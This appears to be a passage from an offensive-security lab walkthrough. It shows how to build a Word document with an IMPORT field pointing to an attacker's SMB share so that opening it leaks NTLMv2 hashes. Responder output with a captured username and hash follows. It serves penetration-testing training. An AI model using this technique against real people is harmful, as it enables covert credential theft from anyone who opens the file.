While Responder is typically used to poison broadcast protocols such as LLMNR, we will now
demonstrate a more interesting way of obtaining NTLMv2 challenge-responses.
Using Remote Objects in Word, we can trick a Windows machine to retrieve an image from a
remote server. This would include an authentication attempt, as the Windows machine would
automatically use Single Sign On (SSO) to try to connect to the network share to retrieve the
image.

## Step 1
Create file

## Step 2
Create a Remote Object 
By pressing Ctrl + F9 Word will create a new empty object, which you can observe in the
below screenshot (i.e. { } ).

Within the curly-brackets ( { } ) proceed to import a network path using the below syntax.

```
IMPORT "\\\\192.168.20.107\\1.jpg"
```

Once done, a nal setting has to be dened to ensure our vicitms connect to our malicious
SMB server. By right-clicking the remote object and selecting "Edit Field...", open the "Field"
window. From the right-pane's "Field options" section, make sure to check the "Data not stored
with document" check-box.
Once done, close the window by pressing the "OK" button.

## Saving and Spreading
With our malicious Word document ready, proceed to save it using the Ctrl + s key-
combination. Make sure to select "Save As" in the blue left-pane after which you can save it on
"This PC", using any name you wish.

You can now proceed to open the Word document, optionally from another Word-equiped
machine and/or user.

## Cheking Results
If you switch back to the Responder session, you will notice a multitude of collected hashes.
Do note that the below output is trimmed as Windows will insist on connecting to the server, so
we'll capture the NTLMv2 Challenge-Response multiple times.

```
__
.----.-----.-----.-----.-----.-----.--| |.-----.----.
| _| -__|__ --| _ | _ | | _ || -__| _|
|__| |_____|_____| __|_____|__|__|_____||_____|__|
|__|
NBT-NS, LLMNR & MDNS Responder 3.0.0.0
Author: Laurent Gaffie (laurent.gaffie@gmail.com)
To kill this script hit CTRL-C
/!\ Warning: files/AccessDenied.html: file not found
/!\ Warning: files/BindShell.exe: file not found
[+] Poisoners:
LLMNR [ON]
NBT-NS [ON]
DNS/MDNS [ON]
[+] Servers:
HTTP server [ON]
HTTPS server [ON]
WPAD proxy [OFF]
Auth proxy [ON]
SMB server [ON]
Kerberos server [ON]
SQL server [ON]
FTP server [ON]
IMAP server [ON]
POP3 server [ON]
SMTP server [ON]
DNS server [ON]
LDAP server [ON]
RDP server [ON]
[+] HTTP Options:
Always serving EXE [OFF]
Serving EXE [OFF]
Serving HTML [OFF]
Upstream Proxy [OFF]
[+] Poisoning Options:
Analyze Mode [OFF]
Force WPAD auth [ON]
Force Basic Auth [OFF]
Force LM downgrade [OFF]
Fingerprint hosts [OFF]
[+] Generic Options:
Responder NIC [ens192]
Responder IP [192.168.20.107]
Challenge set [random]
Don't Respond To Names ['ISATAP']
[!] Error starting TCP server on port 80, check permissions or other servers
running.
[!] Error starting SSL server on port 443, check permissions or other servers
running.
[+] Listening for events...
[SMB] NTLMv2-SSP Client : 192.168.20.105
[SMB] NTLMv2-SSP Username : sec699-40\student_ladm
[SMB] NTLMv2-SSP Hash : student_ladm::sec699-
40:9865961408a2cff0:66140EB41145D1D72F619199864D5819:0101000000000000C0653150DE09D2
[+] Exiting...
```